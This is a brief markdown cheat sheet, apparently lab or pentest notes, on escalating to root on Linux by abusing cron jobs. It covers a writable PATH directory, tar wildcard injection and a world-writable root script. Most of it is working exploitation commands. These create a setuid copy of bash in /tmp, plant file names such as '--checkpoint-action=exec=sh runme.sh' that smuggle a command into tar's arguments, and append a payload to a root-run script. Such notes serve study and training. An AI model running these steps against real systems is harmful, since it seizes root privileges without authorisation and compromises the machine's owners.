https://crontab.guru/#*/2_*_*_*_* **<-- Check to see times**
# Paths

### Victim VM
```bash
$ cat /etc/crontab
	SHELL=/bin/sh
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
	
	# m h dom mon dow user	command
	17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
	25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	#
	* * * * * root overwrite.sh
	* * * * * root /usr/local/bin/compress.sh	# <- Vulnerable
```
### Exploitation
```bash
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
$ chmod +x /home/user/overwrite.sh
$ /tmp/bash -p
```
---
# Wildcards
[Wildcard Priv Esc.](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) **<-Check.**
### Victim VM
```bash
$ cat /etc/crontab
	* * * * * root /usr/local/bin/compress.sh
$ cat /usr/local/bin/compress.sh
	#!/bin/sh
	cd /home/user
	tar czf /tmp/backup.tar.gz *
```
### Exploitation
```bash
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
## Wait for the script to exetuce ##
$ /tmp/bash -p
```
---
# File Overwrite
### Victim VM
```bash
$ cat /etc/crontab
	* * * * * root overwrite.sh
$ ls -l /usr/local/bin/overwrite.sh
	-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
## Wait for the script to execute ##
$ /tmp/bash -p
```